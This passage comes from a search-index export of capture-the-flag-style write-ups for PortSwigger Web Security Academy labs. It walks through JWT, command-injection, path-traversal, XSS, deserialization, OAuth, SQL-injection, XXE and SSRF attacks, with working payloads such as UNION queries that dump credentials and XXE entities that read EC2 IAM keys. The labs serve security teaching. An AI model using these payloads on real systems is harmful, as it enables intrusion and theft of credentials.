a JWT issued as a cookie.</li> </ul> <ul> <li>We decoded the JWT cookie and we realise that it is the same as the above, where <code>\"sub\" : \"wiener\"</code> is used to identify the user.</li> </ul>"},{"location":"Burp_Academy/Apprentice/JWT/#vulnerability-assessment-exploitation_1","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>We attemp to use the technique used above, but it seems like we are unable to bypass the authentication mechanism.</li> </ul> <ul> <li>We downloaded the \"JWT Editor\" extension and in Burp Repeater, we highlight the token and select the 'JSON Web Token' tab.</li> </ul> <ul> <li>We will be led to the editor and we go to the payload section where we change the <code>\"sub:\"</code> to <code>\"sub\" : \"adminstrator\"</code> again.</li> </ul> <ul> <li>However, this time, we go to the bottom of the editor and select \"Attack\" and choose \"none Signing Algorithm\".</li> </ul> <ul> <li>We will get the JWT token below.</li> </ul> <ul> <li>From repeater, we send the request and we get to the admin panel.</li> </ul> <ul> <li>Hence like above, we simply do a \"Match and Replace\" at the proxy.</li> </ul> <ul> <li>The user <code>carlos</code> can be deleted.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Other%20Labs/","title":"Other Labs","text":""},{"location":"Burp_Academy/Apprentice/Other%20Labs/#os-injection","title":"OS Injection","text":""},{"location":"Burp_Academy/Apprentice/Other%20Labs/#os-command-injection-simple-case","title":"OS command injection, simple case","text":"<ul> <li>This lab contains an OS command injection vulnerability in the product stock checker.</li> <li>The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.</li> <li>To solve the lab, execute the whoami command to determine the name of the current user. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Other%20Labs/#enumeration","title":"Enumeration","text":"<ul> <li>We visit the website and randomly visit a product page to see where the vulnerable function is. </li> <li>Below, we can see that there is a \"Check stock\" button and we attempt to try the function out while intercepting it with burp suite. </li> <li>From the request below, we can see that \"Check stock\" will send a <code>POST</code> request and the <code>POST</code> request will contain the parameters.  </li> <li>It seems like <code>storeId</code> can be manipulated.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Other%20Labs/#exploitation-vulnerability-assessment","title":"Exploitation / Vulnerability Assessment","text":"<ul> <li>Hence we try to see if we can elicit a command by doing a <code>ls</code> command </li> <li>From the above response, it seems like we are able to inject command into the query. </li> <li>We try again by reading <code>stockreport.sh</code> and it seems to be the <code>sh</code> file that is running the backend for the stock query.</li> <li>This confirms that using <code>|</code> will allow us to run commands. </li> <li>Hence, we do a <code>| whoami</code> to solve the lab.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Other%20Labs/#directory-traversal","title":"Directory Traversal","text":""},{"location":"Burp_Academy/Apprentice/Other%20Labs/#file-path-traversal-simple-case","title":"File path traversal, simple case","text":"<ul> <li>This lab contains a file path traversal vulnerability in the display of product images.</li> <li>To solve the lab, retrieve the contents of the /etc/passwd file. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Other%20Labs/#enumeration_1","title":"Enumeration","text":"<ul> <li>We are brought to the webpage below </li> <li>We then navigate to view details of a random product </li> <li>We viewed the page source and realised that the image is querying the webserver for a file <code>6.jpg</code>.  </li> </ul>"},{"location":"Burp_Academy/Apprentice/Other%20Labs/#vulnerability-assessment-exploitation","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>We try to query the file directly by using the \"Open Image in New Tab\" </li> <li>True enough, we see that the image appears, seems like <code>?filename=6.jpg</code> does a file read operation. </li> <li>Using burp repeater, we intercept a request with <code>../../../../etc/passwd</code> parameter and look out for the response. </li> <li>As can be seen above, in the response captured, the <code>/etc/passwd</code> of the host is read.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Other%20Labs/#websockets","title":"Websockets","text":""},{"location":"Burp_Academy/Apprentice/Other%20Labs/#manipulating-websocket-messages-to-exploit-vulnerabilities","title":"Manipulating WebSocket messages to exploit vulnerabilities","text":"<ul> <li>This online shop has a live chat feature implemented using WebSockets. Chat messages that you submit are viewed by a support agent in real time.</li> <li>To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser. </li> <li>Web socket exploitation is further mentioned here</li> </ul>"},{"location":"Burp_Academy/Apprentice/Other%20Labs/#enumeration_2","title":"Enumeration","text":"<ul> <li>We access the lab website and on the top right hand corner we see \"Live chat\" </li> <li>We visit the \"Live chat\"  page and below is the page in question. </li> <li>We inspect the page source to see the element responsible for the interactive chat below. </li> <li>As can be seen, <code>wss://0ae600df04a148c4c08ec9a400e00087.web-security-academy.net/chat</code> is used. <code>wss</code> suggests the use of websockets.</li> <li>This is further confirmed with Websockets History on burp suite </li> <li>We then continued on to inspect <code>resources/js/chat.js</code> which gives us the javascript responsible for displaying and sending the message. </li> <li>In the function above, we can see that there is another function <code>writeMessage()</code> that is called which we can see what it does below. </li> <li>The <code>writeMessage()</code> function takes in 3 parameters, <code>className</code>, <code>user</code> and <code>content</code>. </li> <li>As message content is the only thing we can manipulate, our focus will be on lines that contains variables <code>content</code> and <code>contentCell</code>.</li> <li><code>document.createElement(\"td\")</code>,  <code>contentCell.innerHTML = content</code> and <code>row.appendChild(contentCell)</code> will create HTML element <code>&lt;td&gt;content&lt;/td&gt;</code> and append it in row so that messages will appear like below. </li> <li>The send message function below. We notice that there is a <code>foreach</code> loop that places data into an <code>object[]</code> array and does the function <code>htmlEncode()</code>. </li> <li><code>htmlEncode</code> seem to be an input santisation function, however, it does not seem to sanitise <code>'(' and ')'</code>. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Other%20Labs/#vulnerability-assessment-exploitation_1","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>Thus a payload that we can try is as below :  <pre><code>&lt;img src=1 onerror='alert(1)'&gt;\n</code></pre></li> <li>To bypass html encoding, we have to use burp repeater to change out the content below to our payload above. </li> <li>After hitting the 'Send' button, we can see that <code>alert()</code> is successfully triggered. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Other%20Labs/#insecure-deserialization","title":"Insecure Deserialization","text":""},{"location":"Burp_Academy/Apprentice/Other%20Labs/#modifying-serialized-objects","title":"Modifying serialized objects","text":""},{"location":"Burp_Academy/Apprentice/Other%20Labs/#enumeration_3","title":"Enumeration","text":"<ul> <li>This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos's account.</li> <li>You can log in to your own account using the following credentials: <code>wiener:peter</code> </li> <li>Insecure deserialisation is explained here and this explains how to test for and exploit insecure deserialisation. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Other%20Labs/#enumeration_4","title":"Enumeration","text":"<ul> <li>We first visit the website and see that there is a \"My account\" tab. Where we find a login form.  </li> <li>We use the credentials provided and attempt to login. The intercepted POSt request is as such and in the <code>Set-Cookie</code> parameter, we see what looks like a base64 encoded string. </li> <li>We decode the string to get what looks like a PHP serialisation format.  </li> </ul>"},{"location":"Burp_Academy/Apprentice/Other%20Labs/#vulnerability-assessment","title":"Vulnerability Assessment","text":"<ul> <li>To get to the admin panel it seems like we simply need to change <code>b:0</code> to <code>b:1</code> as below and encode it in base64. <pre><code>O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:5:\"admin\";b:1;}7\n</code></pre> </li> <li>The manipulation can be done by intercepting the GET request and modifying the cookie. </li> <li>As can be seen below, the \"Admin panel\" tab is revealed.  </li> </ul>"},{"location":"Burp_Academy/Apprentice/Other%20Labs/#oauth-authentication","title":"OAuth Authentication","text":""},{"location":"Burp_Academy/Apprentice/Other%20Labs/#authentication-bypass-via-oauth-implicit-flow","title":"Authentication bypass via OAuth implicit flow","text":"<ul> <li>This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.</li> <li>To solve the lab, log in to Carlos's account. His email address is <code>carlos@carlos-montoya.net</code>. You can log in with your own social media account using the following credentials: <code>wiener:peter</code>. </li> <li>More about OAuth can be found here and this will explain more about OAuth grant types. Information on OAuth implicit flow can be found here.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Other%20Labs/#enumeration_5","title":"Enumeration","text":"<ul> <li>We first visit the website and we find a \"My account\" tab which leads to a \"social media\" sign in redirect. </li> <li>Below is the redirected page and we subsequently went logged in with the credentials provided.  </li> <li>The requests were proxied and we investigated the exchanges using burp suite proxy HTTP history. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Other%20Labs/#vulnerability-assessment-exploitation_2","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>The interesting request will be the <code>authenticate</code> POST request that comes after the <code>oauth-callback</code> GET request.  </li> <li>The email parameter in the request above was changed to <code>carlos@carlos-montoya.net</code> and sent to repeater. </li> <li>We get a 302 redirect which we right click and choose \"request in browser\".   </li> <li>Upon successful authentication, when we go to \"My account\" the <code>GET</code> request was to <code>id=carlos</code>. </li> <li>We are logged in as Carlos. </li> </ul>"},{"location":"Burp_Academy/Apprentice/SQL%20Injection/","title":"SQL Injection","text":""},{"location":"Burp_Academy/Apprentice/SQL%20Injection/#sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data","title":"SQL injection vulnerability in <code>WHERE</code> clause allowing retrieval of hidden data","text":""},{"location":"Burp_Academy/Apprentice/SQL%20Injection/#enumeration","title":"Enumeration","text":"<ul> <li>We are given the following webpage  </li> </ul>"},{"location":"Burp_Academy/Apprentice/SQL%20Injection/#vulnerability-assessment","title":"Vulnerability Assessment","text":""},{"location":"Burp_Academy/Apprentice/SQL%20Injection/#sql-query","title":"SQL Query","text":"<ul> <li>It is given that the vulnerable SQL query is as below : <pre><code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1\n</code></pre></li> <li>Playing around with the category toggle buttons  </li> <li>leads us to the following <code>GET</code> request. </li> <li>Confirming vulnerability by adding a <code>'</code> or in web encoding <code>%27</code> </li> <li>The resulting <code>Internal Server Error</code> tells us that there is an error in the SQL statement which is expected as with the addition of <code>&amp;27</code> SQL statement becomes :  <pre><code>SELECT * FROM products WHERE category = '' Gifts' AND released = 1\n</code></pre></li> </ul>"},{"location":"Burp_Academy/Apprentice/SQL%20Injection/#exploitation","title":"Exploitation","text":"<ul> <li>Thus with knowledge of the query as well as the type of request to use, we can inject <code>'1 OR 1=1 --</code> and the SQL query will look like below. <pre><code>SELECT * FROM products WHERE category = '' OR 1=1 -- Gifts' AND released = 1\n</code></pre></li> <li>We force a true statement and commented out what is after the true statement to leak out the entire database.  </li> </ul>"},{"location":"Burp_Academy/Apprentice/SQL%20Injection/#sql-injection-vulnerability-allowing-login-bypass","title":"SQL injection vulnerability allowing login bypass","text":""},{"location":"Burp_Academy/Apprentice/SQL%20Injection/#enumeration_1","title":"Enumeration","text":"<ul> <li>We are given the website and based on the title of the Lab we will simply hop to <code>My Account</code> </li> <li>Which gives us a Login page  </li> </ul>"},{"location":"Burp_Academy/Apprentice/SQL%20Injection/#vulnerability-assessment_1","title":"Vulnerability Assessment","text":""},{"location":"Burp_Academy/Apprentice/SQL%20Injection/#testing-for-request-type","title":"Testing for Request Type","text":"<ul> <li>First we will test the parameters to know if it is <code>GET</code> or <code>POST</code> based.  </li> <li>With this ,we now know that a <code>POST</code> request is needed.</li> </ul>"},{"location":"Burp_Academy/Apprentice/SQL%20Injection/#testing-for-vulnerable-parameters","title":"Testing for Vulnerable Parameters","text":"<ul> <li>We will input <code>OR 1=1</code> the Login and Password field individually  </li> <li>The below error is met for both fields hence both fields are likely vulnerable.  We can postulate that the SQL statement is as such <pre><code>SELECT username,password FROM login WHERE username='$input_username' AND password='$input_password'\n</code></pre></li> </ul>"},{"location":"Burp_Academy/Apprentice/SQL%20Injection/#exploitation_1","title":"Exploitation","text":"<ul> <li>Therefore by inputting <code>'OR 1=1 --</code> we will give a true statement and bypass the login. The resulting statement will be as follows :  <pre><code>SELECT username,password FROM login WHERE username=''OR 1=1 -- AND password='$input_password'\n\nSELECT username,password FROM login WHERE username='aa' AND password='' OR 1=1 -- '\n</code></pre></li> </ul> <p>  - And we managed to bypass the login. </p>"},{"location":"Burp_Academy/Apprentice/XXE%20and%20SSRF/","title":"XXE and SSRF","text":"<ul> <li>From the embedded link we can understand a little more about XXE (XML External Entity) as well as XXE injection. </li> <li>It is said also that XXE attack can be escalated and used to compomise server side or back-end infrastructure like SSRF (Server Side Request Forgery).</li> </ul>"},{"location":"Burp_Academy/Apprentice/XXE%20and%20SSRF/#exploiting-xxe-using-external-entities-to-retrieve-files","title":"Exploiting XXE using external entities to retrieve files","text":"<ul> <li>This lab has a \"Check stock\" feature that parses XML input and returns any unexpected values in the response.</li> <li>To solve the lab, inject an XML external entity to retrieve the contents of the <code>/etc/passwd</code> file. </li> </ul>"},{"location":"Burp_Academy/Apprentice/XXE%20and%20SSRF/#enumeration","title":"Enumeration","text":"<ul> <li>We are given a website like below. It does not have muc functions but a \"Home\" button at the top and \"View Details\" button which will lead us to the product.</li> </ul> <ul> <li>In the product page, we see a \"Check stock\" button and its relevant form and javascript.</li> </ul> <p>  - Below is an intercepted <code>POST</code> request and we see that the generated XML entity query.  </p>"},{"location":"Burp_Academy/Apprentice/XXE%20and%20SSRF/#vulnerability-assessment-exploitation","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>We can manipulate the query as below to call for an external entity <code>xxe</code> to read, parse and store the <code>/etc/passwd</code> as <code>xxe</code>. </li> </ul> <ul> <li>XXE attack was successful and the <code>/etc/passwd</code> file of the server was revealed.</li> </ul>"},{"location":"Burp_Academy/Apprentice/XXE%20and%20SSRF/#exploiting-xxe-to-perform-ssrf-attacks","title":"Exploiting XXE to perform SSRF attacks","text":"<ul> <li>This lab has a \"Check stock\" feature that parses XML input and returns any unexpected values in the response.</li> <li>The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is <code>http://169.254.169.254/</code>. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.</li> <li>To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint. </li> </ul>"},{"location":"Burp_Academy/Apprentice/XXE%20and%20SSRF/#enumeration_1","title":"Enumeration","text":"<ul> <li> <p>We get a web page with similar function as the one given above.  </p> </li> <li> <p>So we get to this familiar <code>POST</code> request and we send it to Burp Repeater to manipulate the request.</p> </li> </ul> <p></p>"},{"location":"Burp_Academy/Apprentice/XXE%20and%20SSRF/#vulnerability-assessment-exploitation_1","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>We can see an excerpt from the link below that Instance Metadata Service is a standard API. </li> <li>Hence we will need to craft our payload like below for an XXE attack that will result into SSRF which will enumerate the users that have the credentials.</li> </ul> <pre><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials\"&gt; ]&gt;\n</code></pre> <ul> <li>From below, we can see that there is one user <code>admin</code> with credentials.</li> </ul> <ul> <li>Hence we craft the next payload as below to reveal the credentials that is stored.</li> </ul> <pre><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\"&gt; ]&gt;\n</code></pre> <ul> <li>Credentials are stolen.</li> </ul>"},{"location":"Burp_Academy/Apprentice/XXE%20and%20SSRF/#basic-ssrf-against-the-local-server","title":"Basic SSRF against the local server","text":"<ul> <li>This lab has a stock check feature which fetches data from an internal system.</li> <li>To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. </li> </ul>"},{"location":"Burp_Academy/Apprentice/XXE%20and%20SSRF/#enumeration_2","title":"Enumeration","text":"<ul> <li>We are given a website like below. It has a few functions which is a \"My account\" for logging in, \"Home\" to go back to Home page and \"View details\" to see the details of each product.</li> </ul> <ul> <li>We are not given credentials, and there is no registration or forget password hence logging in might not be the way</li> </ul> <ul> <li>We go to view details to a random product and we see \"Check stock\" function.</li> </ul> <ul> <li>We intercepted the <code>POST</code> request and in the Body of the request we see the below parameter <code>stockApi</code> transmitted.</li> </ul> <ul> <li>The data is url encoded and it leads to an internal webserver. It seems like this <code>stockApi</code> parameter is able to do a request to a webserver.</li> </ul>"},{"location":"Burp_Academy/Apprentice/XXE%20and%20SSRF/#vulnerability-assessment-exploitation_2","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>As the admin function is within the localhost, we appended the following line below to delete the user <code>carlos</code>.</li> </ul> <ul> <li>Request succeeded and carlos was deleted.</li> </ul>"},{"location":"Burp_Academy/Apprentice/XXE%20and%20SSRF/#basic-ssrf-against-another-back-end-system","title":"Basic SSRF against another back-end system","text":"<ul> <li>This lab has a stock check feature which fetches data from an internal system.</li> <li>To solve the lab, use the stock check functionality to scan the internal <code>192.168.0.X</code> range for an admin interface on port 8080, then use it to delete the user carlos. </li> </ul>"},{"location":"Burp_Academy/Apprentice/XXE%20and%20SSRF/#enumeration_3","title":"Enumeration","text":"<ul> <li>We receive a similar webpage as above, hence we will just go to the intercepted HTTP traffic.</li> </ul> <ul> <li>The \"Login\" traffic is still the same, nothing special.</li> </ul> <ul> <li>However, of note would be the 'Check stock' function again, where this time, instead of a domain name, an IP address is called instead. We know that this IP address does not have the admin page (stated by the question).</li> </ul> <ul> <li>Hence we will need to enumerate the IP addresses with <code>stockApi</code>. We first used Burp Repeater to find out the difference in reponse between a valid web server and a webserver that does not exist.</li> </ul> <ul> <li>As can be seen below, \"Could not connect to external stock check service\" is printed on the screen and the portswigger default page is displayed if server does not exist.</li> </ul> <ul> <li>Armed with this knowledge, we sent this <code>POST</code> request to Burp Intruder and set the end of the IP address as the variable payload.</li> </ul> <ul> <li>We created a python script below to generate IP addresses from 1-255.</li> </ul> <pre><code>for x in range(1,256): \n   f = open(\"range.txt\",\"a\")\n   f.write(str(x) + \"\\n\")\n   f.close()\n</code></pre> <ul> <li>Then we loaded the text file as payload.</li> </ul> <ul> <li>As can be seen below, if webserver does not exist, Reponse status 500 would be printed and if webserver exists, it will either be 200 or 404.</li> </ul> <ul> <li>With the above results, we know that <code>192.168.0.31</code> is the likely target. send a POST request to the <code>/admin</code> page and as can be seen below, we see the admin panel.</li> </ul>"},{"location":"Burp_Academy/Apprentice/XXE%20and%20SSRF/#vulnerability-assessment-exploitation_3","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>We proceed to delete the user <code>carlos</code>.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/","title":"SQL Injection DB Enumeration","text":"<ul> <li>For this lab reference to this database version cheatsheet would be the most useful. We will craft our payload based on the cheatsheet given.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#sql-injection-attack-querying-the-database-type-and-version-on-oracle","title":"SQL injection attack, querying the database type and version on Oracle","text":"<ul> <li>To solve the lab, display the database version string. </li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#enumeration","title":"Enumeration","text":"<ul> <li>We are given a web app like below, only has \"Home\" and \"Filter\" function where \"Filter\" function is the only one that accepts parameter in the GET request.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#mapping-application-content","title":"Mapping Application Content","text":""},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#analysing-attack-surface","title":"Analysing Attack Surface","text":"<ul> <li>From the above we can see that the above web application has only one attack surface which is the \"Filter\" function.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#vulnerability-assessment-exploitation","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li> <p>Therefore we will test if the \"Filter\" function is vulnerable to SQL injection. We will use the payload list used in the previous exercise SQL Injection UNION Attack#SQL injection UNION attack, retrieving multiple values in a single column.</p> </li> <li> <p>We set the position of the payload in Burp Intruder as below : </p> </li> </ul> <p></p> <ul> <li>It seems like simply using <code>NULL</code> value does not trigger a <code>200 OK</code> response</li> </ul> <p></p> <ul> <li>All other payloads also gives <code>error 500</code> which means that their database type does not understand the query.</li> </ul> <p></p> <ul> <li> <p>But when <code>null, banner FROM v$version</code> payload is used in place of <code>NULL</code>, a <code>200 OK</code> response is triggered and the version of the database is displayed. </p> </li> <li> <p>With the above information, we can ascertain that the database used is Oracle DB as the payload is a query in the Oracle DB Query Language.</p> </li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft","title":"SQL injection attack, querying the database type and version on MySQL and Microsoft","text":""},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#enumeration_1","title":"Enumeration","text":"<ul> <li>The web application given is similar to #SQL injection attack querying the database type and version on Oracle where only two functions \"Home\" and \"Filter\" are available. Hencew we will not do any futher enumeration but focus on the exploitation.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#vulnerability-assessment-exploitation_1","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li> <p>Likewise, we will use the same payload list used above as well as burp intruder to enumerate the database version.</p> </li> <li> <p>We set the position of the payload in Burp Intruder as below : </p> </li> </ul> <p></p> <ul> <li>It seems like none of the payloads work.</li> </ul> <p></p> <ul> <li>Based on this we attempt to enumerate with an additional payload as below : </li> </ul> <pre><code>' UNION SELECT @@version #     \n' UNION SELECT null,@@version # \n' UNION SELECT @@version,null #\n' UNION SELECT null,null,@@version #\n' UNION SELECT null,@@version,null #\n' UNION SELECT @@version,null,null #\n</code></pre> <p></p> <ul> <li>True enough, when we changed <code>--</code> to <code>#</code> as the comment line, <code>200 OK</code> response is received and the database version is enumerated.</li> </ul> <p></p> <ul> <li>With this we can ascertain that the database used is MySQL as the comment parameter used is <code>#</code>.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#sql-injection-attack-listing-the-database-contents-on-non-oracle-databases","title":"SQL injection attack, listing the database contents on non-Oracle databases","text":"<ul> <li>The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.</li> <li>To solve the lab, log in as the administrator user. </li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#enumeration_2","title":"Enumeration","text":""},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#mapping-application-content_1","title":"Mapping Application Content","text":"<ul> <li>As we analyse the sitemap after browsing the application manually and filling the forms, we notice that there is only 2 functions in this application - Login and Filter</li> </ul> <ul> <li>The Login function takes a POST request and the Login and Password parameters are passed in the Body of the request. </li> </ul> <ul> <li>An Invalid Usernane or password is returned when invalid username or password is entered.</li> </ul> <ul> <li>The Filter function uses a GET request and has the parameter is passed in the URL itself.</li> </ul> <ul> <li>Seems like URL encoding is used.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#analysing-attack-surface_1","title":"Analysing Attack Surface","text":"<ul> <li>There is a \"Login\" function where we can test for SQL injection login bypass.</li> <li>There is a \"Filter\" function where we can use the payload used above to check if it is vulnerable to SQL injection and the database used.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#vulnerability-assessment","title":"Vulnerability Assessment","text":"<ul> <li>Hence we will seek to test the Login and Filter function.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#testing-for-login-bypass-in-login-function","title":"Testing for Login Bypass in Login Function","text":"<ul> <li>For testing Login Bypass we will use the payload Auth_Bypass.txt.</li> </ul> <ul> <li>We will test out the username parameter first then the password parameter with Burp Intruder.</li> </ul> <ul> <li>We noticed that the RESPONSE length for incorrect login is <code>3515</code> and based on that, after iterating through the entire payload, \"username\" and \"password\" parameter does not give us any successful bypass.</li> <li>Therefore we can conclude that Login function is not vulneable to login bypass SQLi.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#testing-filter-function-for-union-sqli","title":"Testing Filter Function for UNION SQLi","text":"<ul> <li>Next we will follow with attacking the \"Filter\" function. Payload used be the one used in exercises above for UNION injection.</li> </ul> <ul> <li>As can be seen below, <code>null, null</code> gives a <code>200 OK</code> response hence we know we have 2 columns to play around with.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#database-version-enumeration","title":"Database Version Enumeration","text":"<ul> <li>Next we also found out that, the database used is PostgreSQL. On top of that, both columns are able to store strings.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#database-tables-enumeration","title":"Database Tables Enumeration","text":"<ul> <li>Hence we continue with enumerating the tables in the databse with the query below.</li> </ul> <pre><code>' UNION SELECT table_name,table_type FROM information_schema.tables --\n</code></pre> <ul> <li>We then come across a unusual table name <code>users_dcgeuu</code></li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#column-enumeration-of-table","title":"Column Enumeration of Table","text":"<ul> <li>We then attempt to enumerate for the columns in the table with the following command : </li> </ul> <pre><code>' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name = 'users_dgceuu' --\n</code></pre> <ul> <li>It seems this table only has two columns, <code>password_zviyrv</code> and <code>username_bsdnky</code></li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#exploitation","title":"Exploitation","text":"<ul> <li>We can now move on leaking the usernames and passwords with the following command:  </li> </ul> <p><pre><code>' UNION SELECT username_bsdnky,password_zviyrv FROM users_dgceuu --\n</code></pre> </p> <ul> <li>The administrator username and password is found and we login to the adminsitrator page to complete the challenge.</li> </ul> <p> </p>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#sql-injection-attack-listing-the-database-contents-on-oracle","title":"SQL injection attack, listing the database contents on Oracle","text":""},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#enumeration_3","title":"Enumeration","text":"<ul> <li>We will skip right to the UNION injection phase of vulnerability assessment as the application given here is similar to #SQL injection attack listing the database contents on non-Oracle databases and that the difference is only in the type and version of database used.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#vulnerablity-assessment","title":"Vulnerablity Assessment","text":"<ul> <li>It seems like the database is not reactive to 'NULL' values. </li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#database-version-enumeration_1","title":"Database Version Enumeration","text":"<ul> <li>Running the <code>banner FROM v$version</code>  query gives us <code>200 OK</code>. This signifies that Oracle DB is in use. </li> <li>From the payload, banner is displayed in both columns. Hence we know that there are two columns and both can display strings. </li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#database-table-enumeration","title":"Database Table Enumeration","text":"<p>Since we know it is Oracle DB, we will use payloads unique to Oracle DB based on its documentation : </p> <pre><code>' UNION SELECT table_name,tablespace_name FROM all_tables--\n</code></pre> <ul> <li>The payload above, will list all the tables that are in the database.</li> </ul> <p></p> <ul> <li>As can be seen below, there is a non-default table <code>USERS_VDYLFP</code>.</li> </ul> <p></p>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#column-enumeration-of-table_1","title":"Column Enumeration of Table","text":"<p>We then follow this all_tab_column documentation to enumerate columns in the table we found.</p> <pre><code>' UNION SELECT column_name,data_type FROM all_tab_columns WHERE table_name = 'USERS_VDYLFP' --\n</code></pre> <ul> <li>As can be seen there are two interesting columns <code>USERNAME_CNBWLE</code> and <code>PASSWORD_PQFZP</code></li> </ul> <p></p>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/#exploitation_1","title":"Exploitation","text":"<ul> <li>Now it is time to leak the rows in the columns which we will use the following query : </li> </ul> <pre><code>' UNION SELECT USERNAME_CNBWLE,PASSWORD_PVQFZP FROM USERS_VDYLFP--\n</code></pre> <ul> <li>Administrator username and password is found and we log in to the account to complete the challenge.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/","title":"SQL Injection UNION Attack","text":"<ul> <li>More on SQL UNION injection can be understood at portswigger's guide on UNION attacks.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query","title":"SQL injection UNION attack, determining the number of columns returned by the query","text":"<ul> <li>To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values. </li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#enumeration","title":"Enumeration","text":""},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#mapping-visible-content","title":"Mapping Visible Content","text":"<ul> <li>We are given the website below with the following functions : \"Login\", \"View Details\", and \"Category Filter\" </li> </ul> <ul> <li>The \"Login\" function uses a POST request to send username and password. </li> </ul> <ul> <li>Below is the result when invalid credentials are used.</li> </ul> <ul> <li>The \"View Details\" function is referenced to <code>/product?productId=&lt;product number&gt;</code>. And each product has its own page.</li> </ul> <p>The \"Category Filter\" functin also makes use of references <code>/filter?category=&lt;text filter&gt;</code></p> <p></p>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#mapping-attack-surface","title":"Mapping Attack Surface","text":"<ul> <li>From quick application mapping above, we can see that there are a few probable vectors of entry for SQLi. The first probable location for SQLi would be \"View Details\" function and the other is in the \"Category Filter\" function.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#vulnerability-analysis-exploitation","title":"Vulnerability Analysis / Exploitation","text":"<ul> <li>Hacktricks has a good explanation of how we can find out the number of columns in the database and payloadbox has a list of payloads we can use to detect SQLi. In this case, we will be using 